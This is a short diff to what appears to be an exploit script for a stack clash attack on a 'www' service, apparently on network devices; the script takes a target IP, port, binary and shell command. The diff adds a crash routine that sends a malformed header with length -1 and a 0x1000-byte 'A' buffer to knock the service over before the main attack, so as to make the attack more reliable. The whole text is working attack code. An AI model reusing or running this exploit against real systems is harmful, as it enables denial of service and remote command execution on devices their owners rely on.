@@ -211,6 +211,14 @@ def stackClash(ip, port, payload):
 
     print("Done!")
 
+def crash(ip, port):
+    print("Crash...")
+    s = makeSocket(ip, port)
+    socketSend(s, makeHeader(-1))
+    socketSend(s, b'A' * 0x1000)
+    s.close()
+    time.sleep(2.5) # www takes up to 3 seconds to restart
+
 if __name__ == "__main__":
     if len(sys.argv) == 5:
         ip       = sys.argv[1]
@@ -224,6 +232,7 @@ if __name__ == "__main__":
         if binRop.contains_string("pthread_attr_setstacksize"):
             AST_STACKSIZE = ROS_STACKSIZE
 
+        crash(ip, port) # should make stack clash more reliable
         stackClash(ip, port, payload)
     else:
         print("Usage: " + sys.argv[0] + " IP PORT binary shellcommand")
